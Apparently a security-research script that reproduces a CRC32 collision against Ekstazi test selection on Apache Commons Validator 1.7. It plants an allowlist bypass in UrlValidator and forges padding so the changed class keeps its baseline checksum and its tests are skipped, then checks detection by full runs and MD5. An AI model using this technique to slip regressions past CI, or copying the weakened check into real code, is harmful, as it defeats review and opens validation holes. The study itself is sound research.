"""Native Ekstazi against original Apache Commons Validator 1.7 tests.
Private isolated reproduction; never submits changes to an upstream project.
The baseline application and tests are byte-original. Only build integration is added.
"""
import hashlib, json, os, shutil, subprocess, sys, tempfile, time
from pathlib import Path
import xml.etree.ElementTree as ET
OUT=Path(sys.argv[1]).resolve();OUT.mkdir(parents=True,exist_ok=True)
R=OUT.parent/'commons-validator-source'
RUNNER=Path(__file__).resolve().parent
UPSTREAM='f9bb21748a9f9c50fbc31862de25ed49433ecc88'
JAR=Path.home()/'.m2/repository/org/ekstazi/org.ekstazi.core/5.3.0/org.ekstazi.core-5.3.0.jar'
CP=os.pathsep.join([str(RUNNER),str(JAR)])
PAD='0000000000000000'
rows=[]
def sha(p):return hashlib.sha256(p.read_bytes()).hexdigest()
def command(args,cwd=None,check=True,timeout=300):
    x=subprocess.run(args,cwd=cwd or R,capture_output=True,text=True,timeout=timeout)
    if check and x.returncode:raise RuntimeError(str(args)+'\n'+x.stdout+'\n'+x.stderr)
    return x
if R.exists():shutil.rmtree(R)
command(['git','clone','--depth','1','--branch','VALIDATOR_1_7','https://github.com/apache/commons-validator.git',str(R)],cwd=OUT)
assert command(['git','rev-parse','HEAD']).stdout.strip()==UPSTREAM
TARGET=R/'src/main/java/org/apache/commons/validator/routines/UrlValidator.java'
CF=R/'target/classes/org/apache/commons/validator/routines/UrlValidator.class'
original=TARGET.read_text(encoding='utf-8')
assert 'SP2027_PAD' not in original
TESTS={str(p.relative_to(R)):sha(p) for p in (R/'src/test').rglob('*') if p.is_file()}
PRODUCTION={str(p.relative_to(R)):sha(p) for p in (R/'src/main').rglob('*') if p.is_file()}
# Preserve all original test bytes; fixed build integration selects two actual upstream test classes.
pom=R/'pom.xml';(OUT/'upstream-pom.xml').write_bytes(pom.read_bytes())
NS='http://maven.apache.org/POM/4.0.0';ET.register_namespace('',NS)
q=lambda tag:'{'+NS+'}'+tag
xml=ET.parse(pom);root=xml.getroot()
plugins=root.find(q('build')).find(q('plugins'))
s=ET.SubElement(plugins,q('plugin'))
for k,v in [('groupId','org.apache.maven.plugins'),('artifactId','maven-surefire-plugin'),('version','3.2.5')]:ET.SubElement(s,q(k)).text=v
cfg=ET.SubElement(s,q('configuration'));incs=ET.SubElement(cfg,q('includes'))
for name in ['UrlValidatorTest','RegexValidatorTest']:ET.SubElement(incs,q('include')).text='**/routines/'+name+'.java'
profiles=root.find(q('profiles'))
if profiles is None:profiles=ET.SubElement(root,q('profiles'))
profile=ET.SubElement(profiles,q('profile'));ET.SubElement(profile,q('id')).text='ekstazi-study'
build=ET.SubElement(profile,q('build'));pls=ET.SubElement(build,q('plugins'))
e=ET.SubElement(pls,q('plugin'))
for k,v in [('groupId','org.ekstazi'),('artifactId','ekstazi-maven-plugin'),('version','5.3.0')]:ET.SubElement(e,q(k)).text=v
exs=ET.SubElement(e,q('executions'));ex=ET.SubElement(exs,q('execution'));ET.SubElement(ex,q('id')).text='study-selection'
goals=ET.SubElement(ex,q('goals'))
for v in ['select','restore']:ET.SubElement(goals,q('goal')).text=v
s=ET.SubElement(pls,q('plugin'))
for k,v in [('groupId','org.apache.maven.plugins'),('artifactId','maven-surefire-plugin'),('version','3.2.5')]:ET.SubElement(s,q(k)).text=v
cfg=ET.SubElement(s,q('configuration'));ET.SubElement(cfg,q('excludesFile')).text='${java.io.tmpdir}/${user.name}EkstaziExcludes'
xml.write(pom,encoding='utf-8',xml_declaration=True)
(OUT/'integrated-pom.xml').write_bytes(pom.read_bytes())
POMHASH=sha(pom)
(OUT/'upstream-test-hashes.json').write_text(json.dumps(TESTS,indent=2))
(OUT/'upstream-source-hashes.json').write_text(json.dumps(PRODUCTION,indent=2))
(OUT/'source-provenance.json').write_text(json.dumps({'repository':'apache/commons-validator','tag':'VALIDATOR_1_7','commit':UPSTREAM,'scope':'unchanged routines.UrlValidatorTest and routines.RegexValidatorTest, not entire upstream suite','ekstazi_version':'5.3.0','pom_sha256':POMHASH},indent=2))
def run(label,profile=True):
    reports=R/'target/surefire-reports'
    if reports.exists():shutil.rmtree(reports)
    cmd=['mvn','-B','-ntp','-Dcheckstyle.skip','-Drat.skip=true']+(['-Pekstazi-study'] if profile else [])+['test']
    t=time.perf_counter();x=command(cmd,check=False)
    (OUT/(label+'.log')).write_text(x.stdout+'\n'+x.stderr)
    tests=[]
    if reports.exists():
        shutil.copytree(reports,OUT/(label+'-surefire'))
        for f in reports.glob('TEST-*.xml'):
            for c in ET.parse(f).getroot().findall('testcase'):
                outcome='failed' if c.find('failure') is not None else 'error' if c.find('error') is not None else 'skipped' if c.find('skipped') is not None else 'passed'
                tests.append({'class':c.get('classname'),'name':c.get('name'),'outcome':outcome})
    result={'condition':label,'exit':x.returncode,'seconds':round(time.perf_counter()-t,4),'tests':tests}
    rows.append(result);(OUT/'outcomes.json').write_text(json.dumps(rows,indent=2))
    if (R/'.ekstazi').is_dir():shutil.copytree(R/'.ekstazi',OUT/(label+'-metadata'))
    print('UPSTREAM_OBSERVED '+json.dumps({'condition':label,'exit':x.returncode,'executed':len(tests),'failed':[z for z in tests if z['outcome'] in ('failed','error')],'seconds':result['seconds']}),flush=True)
    return result

def compile_source():command(['mvn','-B','-ntp','-Dcheckstyle.skip','-Drat.skip=true','-DskipTests','compile'])
def fingerprint(data):
    with tempfile.NamedTemporaryFile(suffix='.class') as f:
        f.write(data);f.flush();return int(command(['java','-cp',CP,'HashProbe',f.name]).stdout.strip(),16)
def restore():
    if (R/'.ekstazi').exists():shutil.rmtree(R/'.ekstazi')
    shutil.copytree(OUT/'trusted-baseline-metadata',R/'.ekstazi')

a=run('baseline');assert a['exit']==0 and len(a['tests'])>=30, ('baseline_failed',len(a['tests']))
baseline=CF.read_bytes();(OUT/'baseline.class').write_bytes(baseline);(OUT/'baseline.java').write_text(original)
assert JAR.is_file();command(['javac','-cp',str(JAR),'-d',str(RUNNER),str(RUNNER/'HashProbe.java')])
base_crc=fingerprint(baseline)
shutil.copytree(R/'.ekstazi',OUT/'trusted-baseline-metadata')
b=run('nochange');assert b['exit']==0
needle='if (isOff(ALLOW_ALL_SCHEMES) && !allowedSchemes.contains(scheme.toLowerCase(Locale.ENGLISH))) {\n            return false;'
assert original.count(needle)==1
ordinary=original.replace(needle,needle.replace('return false;','return true;'))
TARGET.write_text(ordinary);c=run('ordinary')
assert c['exit']!=0 and any(z['outcome']=='failed' and z['class'].endswith('.UrlValidatorTest') for z in c['tests'])
# Add harmless adjustable field ONLY to the candidate, not the trusted baseline.
brace=ordinary.index('{',ordinary.index('public class UrlValidator'))
def padded(pad):return ordinary[:brace+1]+'\n    private static final String SP2027_PAD = "'+pad+'";\n'+ordinary[brace+1:]
restore();TARGET.write_text(padded(PAD));compile_source()
raw=CF.read_bytes();assert raw.count(PAD.encode())==1;offset=raw.index(PAD.encode());current=fingerprint(raw)
start=time.perf_counter();basis={}
for i in range(64):
    modified=bytearray(raw);modified[offset+i//4]^=1<<(i%4)
    v=fingerprint(modified)^current;m=1<<i
    while v:
        pivot=v.bit_length()-1
        if pivot not in basis:basis[pivot]=(v,m);break
        x,y=basis[pivot];v^=x;m^=y
assert len(basis)==32
v=base_crc^current;sol=0
while v:
    x,y=basis[v.bit_length()-1];v^=x;sol^=y
values=[0]*16
for i in range(64):
    if sol>>i&1:values[i//4]^=1<<(i%4)
pad=''.join(chr(48^n) for n in values)
TARGET.write_text(padded(pad));compile_source();collided=CF.read_bytes()
assert fingerprint(collided)==base_crc and hashlib.sha256(collided).digest()!=hashlib.sha256(baseline).digest()
(OUT/'collision.class').write_bytes(collided);(OUT/'collision.java').write_bytes(TARGET.read_bytes());candidate_text=TARGET.read_text()
(OUT/'collision-proof.json').write_text(json.dumps({'baseline_crc32':base_crc,'candidate_crc32':fingerprint(collided),'baseline_sha256':hashlib.sha256(baseline).hexdigest(),'candidate_sha256':hashlib.sha256(collided).hexdigest(),'generation_seconds':round(time.perf_counter()-start,4),'padding':pad,'baseline_has_padding':False,'security_regression':'configured URL-scheme allowlist denial changed to allow','core_jar_sha256':sha(JAR)},indent=2))
d=run('collision');e=run('collision_full',False)
assert e['exit']!=0 and any(z['outcome']=='failed' and z['class'].endswith('.UrlValidatorTest') for z in e['tests'])
# Same immutable test sources; harmless refactor of one unrelated production method yields nonzero selection.
# Do not alter tests to manufacture a passing run.
regex=R/'src/main/java/org/apache/commons/validator/routines/RegexValidator.java'
regex_original=regex.read_text();needle2='return false;'
assert needle2 in regex_original
regex.write_text(regex_original.replace(needle2,'return Boolean.FALSE.booleanValue();',1))
restore();f=run('collision_nonzero');g=run('collision_nonzero_full',False)
regex.write_text(regex_original)
# Native MD5 A/B control: rebuild trusted dependency metadata using its own native option.
# This blocks THIS CRC32 construction; MD5 is not proposed as a modern security defense.
TARGET.write_text(original)
if (R/'.ekstazi').exists():shutil.rmtree(R/'.ekstazi')
(R/'.ekstazirc').write_text('hash.algorithm=MD5\n')
h=run('md5_baseline');assert h['exit']==0
TARGET.write_text(candidate_text);i=run('md5_collision')
assert {str(p.relative_to(R)):sha(p) for p in (R/'src/test').rglob('*') if p.is_file()}==TESTS
assert sha(pom)==POMHASH
summary={'subject':'Apache Commons Validator 1.7','upstream_commit':UPSTREAM,'upstream_tests_unchanged':True,'baseline_test_count':len(a['tests']),'collision_missed':d['exit']==0 and not any(z['class'].endswith('.UrlValidatorTest') for z in d['tests']),'nonzero_missed':f['exit']==0 and any(z['outcome']=='passed' for z in f['tests']) and not any(z['class'].endswith('.UrlValidatorTest') for z in f['tests']),'full_detected':e['exit']!=0 and g['exit']!=0,'md5_detected_this_crc_collision':i['exit']!=0 and any(z['outcome']=='failed' for z in i['tests']),'baseline_padding_precondition':False,'limit':'two original upstream test classes, not full library suite; historical pinned release; source regression intentionally injected'}
(OUT/'summary.json').write_text(json.dumps(summary,indent=2));print('UPSTREAM_RESEARCH_RESULT '+json.dumps(summary),flush=True)
